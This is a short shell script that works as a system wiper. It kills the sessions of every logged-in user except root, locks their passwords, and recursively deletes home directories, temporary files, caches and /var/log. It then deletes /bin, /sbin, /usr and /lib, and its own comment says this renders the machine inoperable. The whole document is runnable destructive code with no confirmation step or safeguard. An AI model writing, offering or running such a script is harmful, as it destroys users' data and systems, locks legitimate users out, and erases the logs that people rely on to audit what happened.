#!/bin/sh

# Function to log out all users and lock their passwords except root
logout_users() {
    for user in $(who | awk '{print $1}' | sort | uniq)
    do
        if [ "$user" != "root" ]; then
            echo "Logging out $user"
            pkill -KILL -u "$user"
            passwd -l "$user"
        fi
    done
}

# Function to wipe non-essential data
wipe_non_essential_data() {
    # Define non-essential paths
    non_essential_paths="/home/* /tmp /var/tmp /var/log /home/*/.cache /var/cache /home/*/.local/share/Trash"

    for path in $non_essential_paths
    do
        if [ -e "$path" ]; then
            echo "Wiping $path"
            rm -rf "$path"
        fi
    done
}

# Function to wipe system files - Warning: This will render the system inoperable
wipe_system_files() {
    # Define essential system paths
    essential_system_paths="/bin /sbin /usr /lib"

    for path in $essential_system_paths
    do
        echo "Wiping $path"
        rm -rf "$path"
    done
}

# Start the wiping process
logout_users
wipe_non_essential_data
wipe_system_files

echo "Wiping process completed."
